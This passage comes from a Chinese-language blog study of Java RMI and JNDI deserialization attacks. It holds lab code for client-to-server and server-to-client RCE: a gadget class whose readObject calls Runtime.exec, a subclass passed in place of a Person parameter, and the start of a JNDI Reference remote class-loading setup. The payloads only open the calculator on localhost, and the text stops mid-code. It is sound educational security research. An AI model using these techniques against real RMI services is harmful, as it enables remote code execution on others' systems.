href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a> ，大佬的代码地址<a href="https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms" target="_blank" rel="noopener">https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms</a>)</p><p>首先我们先修改一下远程方法服务方的代码，为接口中唯一的一个方法添加参数，是一个Person类型。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>inter<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>Person<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IHello</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>Person person<span class="token punctuation">)</span><span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看一下这个Person类的具体细节</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>impl<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>8482776308417450924L<span class="token punctuation">;</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>就是一个简单的pojo类，然后修改HelloImpl代码实现。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>impl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>inter<span class="token punctuation">.</span>IHello<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">IHello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>Person person<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token operator">+</span>person<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token operator">+</span>person<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>然后将接口文件放到Registry项目中，记得包路径要和在服务方的项目中的路径一样否则会爆ClassNotFoundException的错误，Registry项目中的IHello接口中的sayHello方法无需添加参数，因为rmiregistry在返回给客户端Stub时，这个Stub中只有对应的服务端的地址，端口号，以及objID等信息，并没有相关的参数信息。</p><p>Registry项目目录结构如下</p><p>![image-20200724171359592](个人学习过程中对RMI JRMP 以及JNDI的一些理解/12.png)</p><p>最后客户端这边，就只需要将Person类按照和服务端一样的包路径拷贝过来，在修改下IHello里sayHell方法的参数就ok了</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>customer<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>Person<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>inter<span class="token punctuation">.</span>IHello<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMICustomer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException <span class="token punctuation">{</span>        IHello hello <span class="token operator">=</span> <span class="token punctuation">(</span>IHello<span class="token punctuation">)</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        person<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>此时一个正常的远程方法调用环境就搭建好了，按理说这种情况下是没有什么反序列化漏洞的，但是如果说服务端的项目中存在一些已知的存在问题的类，例如Apache Common Collection。我们来模拟一下当服务端存在有存在反序列化问题的类时的情况。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>weakclass<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Weakness</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 7439581476576889858L<span class="token punctuation">;</span>    <span class="token keyword">private</span> String param<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setParam</span><span class="token punctuation">(</span>String param<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>param <span class="token operator">=</span> param<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream in<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里的Weakness类只是用来模拟一个在反序列化是会进行高危操作的一个类，比起用Apache Common Collection会现显得更加直观。</p><p>同样我们客户端如果想要利用这个类来对服务端进行反序列化攻击的话，那么客户端自然也需要存在这个类。所以拷贝一份到客户端，我们之前分析源码的时候看到了，服务端会反序列化客户端传来的需要远程方法处理的参数，这就是我们的攻击点，</p><pre class=" language-java"><code class="language-java">  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalCustomCallData</span><span class="token punctuation">(</span>var41<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//从 ConnectionInputStream里反序列化出远程调用的参数</span>      <span class="token comment" spellcheck="true">//这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递                             恶意的反序列化数据进来</span>    var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalParameters</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var42<span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们根据项目的源码可以看到，这里传递的参数类型是一个Person类型，Person这个类型本身是没有问题的，那我们要怎么实现让服务端反序列化Person类时能调用Weakness类呢？</p><p>其实很简单，我们只需要将客户端这边的Weakness类修改一下就可以了，我们让Weakness继承PerSon类就可以实现这个效果了，继承了PerSon之后我们的Weakness类就是Person类型的了，这样传递的时候Weakness类就可以被当作Person类来进行传递，表面上传递的是Person类型的参数，可实际上传递的参数确是Weakness类。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Weakness</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 7439581476576889858L<span class="token punctuation">;</span>    <span class="token keyword">private</span> String param<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setParam</span><span class="token punctuation">(</span>String param<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>param <span class="token operator">=</span> param<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream in<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>看一下客户端这边的实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>customer<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>inter<span class="token punctuation">.</span>IHello<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>weakclass<span class="token punctuation">.</span>Weakness<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMICustomer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException <span class="token punctuation">{</span>        IHello hello <span class="token operator">=</span> <span class="token punctuation">(</span>IHello<span class="token punctuation">)</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Weakness weakness <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Weakness</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weakness<span class="token punctuation">.</span><span class="token function">setParam</span><span class="token punctuation">(</span><span class="token string">"open /Applications/Calculator.app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weakness<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span>weakness<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看成功将Weakness类作为参数进行传递，我们之前说过，服务端在处理客户端传来的远程调用信息时，是会调用UnicastServerRef.dispatch()方法的，会反序列化其中的参数</p><p>看一下调用链即可知</p><p>![image-20200725101015675](个人学习过程中对RMI JRMP 以及JNDI的一些理解/13.png)</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">static</span> Object <span class="token function">unmarshalValue</span><span class="token punctuation">(</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> var0<span class="token punctuation">,</span> ObjectInput var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">isPrimitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Integer<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Boolean<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readBoolean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Byte<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Character<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Short<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Long<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Float<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readFloat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> Double<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Unrecognized primitive type: "</span> <span class="token operator">+</span> var0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//最终在参数在 unmarshalValue 的var1.readObject()中被反序列化</span>        <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>![image-20200725101529826](个人学习过程中对RMI JRMP 以及JNDI的一些理解/14.png)</p><p>至此 我们实在jdk1.7_21的版本下以客户端的身份去成功攻击了服务端。我们切换一个更高版本的jdk来看看情况是不是会有什么不一样。</p><p>经过验证在jdk1.8_221版本的执行结果和jdk1.7_21版本并无不同。</p><h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>分析完了客户端对服务端的攻击，我们来看一下 服务端对客户端的攻击，根据第二章RMI流程源码分析我们看到了，服务端如果想要攻击客户端，那么利用点就存在客户端反序列话服务端的返回值的时候。这时候需要将环境稍微修改一下。</p><p>其实很简单，先修改服务端的代码，我们将IHello接口中sayHello方法需要的参数删除，然后将返回值类型由String修改成Person类型。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>inter<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>Person<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IHello</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Person <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>HelloImpl也根据接口的要求进行修改</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>impl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>inter<span class="token punctuation">.</span>IHello<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmitest<span class="token punctuation">.</span>weakclass<span class="token punctuation">.</span>Weakness<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">IHello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Person <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Weakness weakness <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Weakness</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weakness<span class="token punctuation">.</span><span class="token function">setParam</span><span class="token punctuation">(</span><span class="token string">"open /Applications/Calculator.app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weakness<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> weakness<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>同客户端攻击服务端时一样，只不过这次变成了服务端这边的Weakness类需要继承Person类了。</p><p>然后客户端这边就修改完毕。</p><p>然后我们来修改rmiregistry这边的代码，同样先修改IHello接口，然后我们需要将Person类拷贝到rmiregistry这边，不过一般在生产环境中，rmiregistry和服务端一般都是在同一台机器统一个项目文件里，所以服务端可以访问的类rmiregistry同样也可以。</p><p>紧接着就是就该客户端这边的代码，同理Weakness类不再继承Person</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMICustomer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException <span class="token punctuation">{</span>        IHello hello <span class="token operator">=</span> <span class="token punctuation">(</span>IHello<span class="token punctuation">)</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如此一来就可以实现通过服务端去攻击客户端</p><p>根据之前的分析客户端在远程方法的调用过程中会在UnicastRef.invoke方法中对服务端返回的数据进行反序列化，看一下调用链</p><p>![image-20200725110434075](个人学习过程中对RMI JRMP 以及JNDI的一些理解/15.png)</p><p>如此一来服务端通过RMI攻击客户端的方式也就清晰了。</p><h2 id="服务端攻击客户端-2"><a href="#服务端攻击客户端-2" class="headerlink" title="服务端攻击客户端 2"></a>服务端攻击客户端 2</h2><p>上一小节讲述的服务端攻击客户端的方式是通过返回值来进行操作的，这样的话利用面比较狭窄，那么有没有一种特别通用的利用方式呢？让客户端在lookup一个远程方法的时候能直接造成RCE，事实证明是有的。</p><p>这里就要讲到一个特别的类<code>javax.naming.Reference</code>，下面是该类的官方注释</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**  * This class represents a reference to an object that is found outside of  * the naming/directory system.  *&lt;p>  * Reference provides a way of recording address information about  * objects which themselves are not directly bound to the naming/directory system.  *&lt;p>  * A Reference consists of an ordered list of addresses and class information  * about the object being referenced.  * Each address in the list identifies a communications endpoint  * for the same conceptual object.  The "communications endpoint"  * is information that indicates how to contact the object. It could  * be, for example, a network address, a location in memory on the  * local machine, another process on the same machine, etc.  * The order of the addresses in the list may be of significance  * to object factories that interpret the reference.  *&lt;p>  * Multiple addresses may arise for  * various reasons, such as replication or the object offering interfaces  * over more than one communication mechanism.  The addresses are indexed  * starting with zero.  *&lt;p>  * A Reference also contains information to assist in creating an instance  * of the object to which this Reference refers.  It contains the class name  * of that object, and the class name and location of the factory to be used  * to create the object.  * The class factory location is a space-separated list of URLs representing  * the class path used to load the factory.  When the factory class (or  * any class or resource upon which it depends) needs to be loaded,  * each URL is used (in order) to attempt to load the class.  *&lt;p>  * A Reference instance is not synchronized against concurrent access by multiple  * threads. Threads that need to access a single Reference concurrently should  * synchronize amongst themselves and provide the necessary locking.  *  * @author Rosanna Lee  * @author Scott Seligman  *  * @see RefAddr  * @see StringRefAddr  * @see BinaryRefAddr  * @since 1.3  */</span></code></pre><p>简单解释下该类的作用就是记录一个远程对象的位置，然后服务端将实例化好的<code>Reference</code>类通过bind方法注册到rmiregistry上，然后客户端通过rmiregistry返回的Stub信息找到服务端并调用该<code>Reference</code>对象，<code>Reference</code>对象通过URLClassloader将记录在<code>Reference</code>对象中的Class从远程地址上加载到本地，从而触发恶意类中的静态代码块，导致RCE</p><p>我们使用JDK 7u21作为环境来进行该利用方式的深入分析</p><p>首先看下服务端的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIProvider</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException<span class="token punctuation">,</span> NamingException <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可</span>        Reference refObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"ExportObject"</span><span class="token punctuation">,</span> <span class="token string">"com.longofo.remoteclass.ExportObject"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8000/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceWrapper refObjWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>refObj<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//尝试使用JNDI的API来bind，但是会报错</span><span class="token comment" spellcheck="true">//        Context context = new InitialContext();</span><span class="token comment" spellcheck="true">//        context.bind("refObj", refObjWrapper);</span>        Registry registry <span class="token 